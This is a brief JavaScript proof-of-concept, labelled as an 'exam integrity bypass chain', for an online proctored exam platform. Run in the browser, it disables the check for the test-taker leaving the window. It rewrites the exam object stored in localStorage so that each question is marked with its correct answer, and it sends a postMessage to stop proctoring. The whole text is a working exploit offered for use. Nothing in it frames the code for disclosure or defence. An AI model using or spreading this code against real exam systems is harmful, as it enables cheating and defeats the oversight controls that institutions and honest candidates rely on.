

(function() {
    console.log("=== EXECUTING FULL EXAM INTEGRITY BYPASS CHAIN (PoC 10) ===");

    window.DisableForegroundingFromMainForDebugging = true;
    console.log("[+] Step 1: Blur detection disabled.");

    const rawData = localStorage.getItem("ExamQuestionsObj");
    if (rawData) {
        const exam = JSON.parse(rawData);
        if (exam && exam.QuestionsJSON) {
            exam.QuestionsJSON.forEach(q => {
                if (q.CorrectAns) {
                    q.selectedOpt = q.CorrectAns;
                    q.isAnswerCorrect = true;
                }
            });
            localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));
            console.log("[+] Step 2: Exam questions mutated to correct state.");
        }
    }

    window.postMessage({ msg: "stop", Action: "stop" }, "*");
    console.log("[+] Step 3: Proctoring shutdown signal dispatched via postMessage.");

    console.log("=== BYPASS CHAIN COMPLETE. CLICK SUBMIT FOR PERFECT SCORE ===");
})();
